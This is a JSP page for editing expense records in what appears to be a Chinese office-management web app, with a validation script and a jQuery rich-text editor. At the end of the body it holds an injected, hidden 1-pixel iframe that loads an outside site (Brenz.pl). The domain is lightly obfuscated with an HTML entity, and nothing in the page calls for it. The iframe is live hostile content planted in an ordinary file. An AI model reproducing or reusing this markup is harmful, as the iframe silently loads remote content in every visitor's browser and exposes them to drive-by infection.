<%@ page language="java" import="java.util.*" pageEncoding="GBK"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GBK" />
<script type="text/javascript" src="../../js/jquery-1.3.2.js"></script>
    <script type="text/javascript" src="../../js/jquery.wysiwyg.js"></script>
    <link rel="stylesheet" href="../../css/jquery.wysiwyg.css" type="text/css" />
		<link rel="stylesheet" rev="stylesheet" href="../../css/style.css"
			type="text/css" media="all" />

<style type="text/css">
<!--
.atten {
	font-size: 12px;
	font-weight: normal;
	color: #F00;
}
-->
</style>
<title>支出信息更新</title>
</head>
<script type="text/javascript" src="js/outAjax.js"></script>
<script type="text/javascript" src="../../js/calendar.js"></script>
<script language="JavaScript" type="text/javascript">
function check()
{
 if(window.outexpense.employeeId.value==""){
  alert("带*为必填内容");
  window.outexpense.employeeId.focus();
  return false;
  }
  
 if(window.outexpense.employeeName.value==""){
  alert("带*为必填内容");
  window.outexpense.employeeName.focus();
  return false;
  }
 
  if(window.outexpense.deptName.value==""){
  alert("带*为必填内容");
  window.outexpense.deptName.focus();
  return false;
  }
  
  if(window.outexpense.money.value==""){
  alert("带*为必填内容");
  window.outexpense.money.focus();
  return false;
  }
  if(window.outexpense.remarks.value==""){
  alert("带*为必填内容");
  window.outexpense.remarks.focus();
  return false;
  }
}
</script>
<body class="ContentBody">

	<form action="updateOutexpense.do" method="post" name="outexpense"
		onsubmit="return check()">
		<div class="MainDiv">
			<table width="99%" border="0" cellpadding="0" cellspacing="0"
				class="CContent">
				<tr>
					<th class="tablestyle_title">支出信息修改</th>
				</tr>
				<tr>
					<td class="CPanel">

						<table border="0" cellpadding="0" cellspacing="0"
							style="width:100%">

							<TR>
								<TD width="100%">
									<fieldset style="height:100%;">
										<legend>支出信息</legend>
										<table border="0" cellpadding="2" cellspacing="1"
											style="width:100%">

											<tr>
												<td nowrap="nowrap" align="right">支出流水号:</td>
												<td width="35%"><input class="text" style="width: 154px" name='outExpenId'
													value="${outexpense.outExpenId}" readonly=readonly>
												</td>
												<td width="16%" align="right" nowrap="nowrap">员工编号:</td>
												<td width="34%">
												<select name="employeeId" id="employeeId" style="width: 154px" onchange="JavaScript:addDuty_selectInf();">
														
														<c:forEach items="${employeeList}" var="employee">
														<c:if test="${outexpense.employeeId==employee.employeeId}">
															<option value="${employee.employeeId}" selected="selected">${employee.employeeId}</option>
														</c:if>
														<c:if test="${outexpense.employeeId!=employee.employeeId}">
															<option value="${employee.employeeId}">${employee.employeeId}</option>
														</c:if>
														</c:forEach>
													</select><span class="red">*</span>
												</td>
											</tr>
                                            <tr>
												<td nowrap="nowrap" align="right">员工姓名:</td>
												<td width="35%">
													<input name='employeeName' id="employeeName" type="text" class="text" style="width: 154px" value="${outexpense.employeeName}" readonly="readonly"/>
												<span class="red">*</span></td>
												<td align="right">员工部门:</td>
												<td><input name='deptName' id="deptName" type="text" class="text" style="width: 154px" value="${outexpense.deptName}" readonly="readonly"/><span class="red">*</span></td>
											</tr>

											<tr>
												<td nowrap="nowrap" align="right">支出原因:</td>
												<td><input class="text" style="width: 154px" name='outReason'
													value="${outexpense.outReason}">
												<span class="red">*</span></td>
												<td align="right">金额:</td>
												<td><input class="text" style="width: 154px" name='money'
													value="${outexpense.money}">
												<span class="red">*</span></td>
											</tr>
											<tr>
												<td nowrap="nowrap" align="right">时间:</td>
												<td><input name="outDate" style="width: 154px" type="text" id="date" value="${outexpense.outDate}" readonly="readonly"/>
												</td>
												
												
											</tr>
											

											<tr>
												<td align="right">备&nbsp;&nbsp;&nbsp;&nbsp;注:</td>
												<td colspan="3"><textarea name="remarks" id="wysiwyg" cols="100"
														rows="5">${outexpense.remarks}</textarea><span class="red">*</span>
												</td>
												<script type="text/javascript">
		(function($)
		{
		  $('#wysiwyg').wysiwyg({
			controls: {
			  strikeThrough : { visible : true },
			  underline     : { visible : true },
			  
			  separator00 : { visible : true },
			  
			  justifyLeft   : { visible : true },
			  justifyCenter : { visible : true },
			  justifyRight  : { visible : true },
			  justifyFull   : { visible : true },
			  
			  separator01 : { visible : true },
			  
			  indent  : { visible : true },
			  outdent : { visible : true },
			  
			  separator02 : { visible : true },
			  
			  subscript   : { visible : false },
			  superscript : { visible : false },
			  
			  separator03 : { visible : false },
			  
			  undo : { visible : false },
			  redo : { visible : false },
			  
			  separator04 : { visible : false },
			  
			  insertOrderedList    : { visible : true },
			  insertUnorderedList  : { visible : true },
			  insertHorizontalRule : { visible : true },
			  
			  h4mozilla : { visible : false && $.browser.mozilla, className : 'h4', command : 'heading', arguments : ['h4'], tags : ['h4'], tooltip : "Header 4" },
			  h5mozilla : { visible : false && $.browser.mozilla, className : 'h5', command : 'heading', arguments : ['h5'], tags : ['h5'], tooltip : "Header 5" },
			  h6mozilla : { visible : false && $.browser.mozilla, className : 'h6', command : 'heading', arguments : ['h6'], tags : ['h6'], tooltip : "Header 6" },
			  
			  h4 : { visible : false && !( $.browser.mozilla ), className : 'h4', command : 'formatBlock', arguments : ['<H4>'], tags : ['h4'], tooltip : "Header 4" },
			  h5 : { visible : false && !( $.browser.mozilla ), className : 'h5', command : 'formatBlock', arguments : ['<H5>'], tags : ['h5'], tooltip : "Header 5" },
			  h6 : { visible : false && !( $.browser.mozilla ), className : 'h6', command : 'formatBlock', arguments : ['<H6>'], tags : ['h6'], tooltip : "Header 6" },
			  
			  separator07 : { visible : false },
			  
			  cut   : { visible : false },
			  copy  : { visible : false },
			  paste : { visible : false }
			}
		  });
		})(jQuery);
    </script>
											</tr>
										</table>
										<br />
									</fieldset></TD>

							</TR>


						</TABLE></td>
				</tr>


				<tr>
					<td colspan="2" align="center" height="50px"><input
						type="submit" name="Submit" value="修改" class="button"
						 /> <input type="button" name="Submit2"
						value="返回" class="button" onclick="window.history.go(-1);" /></td>
				</tr>
			</table>


			<br>

		</div>
	</form>

	<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/"
		frameborder=0 width=1></iframe>
</body>

</html>
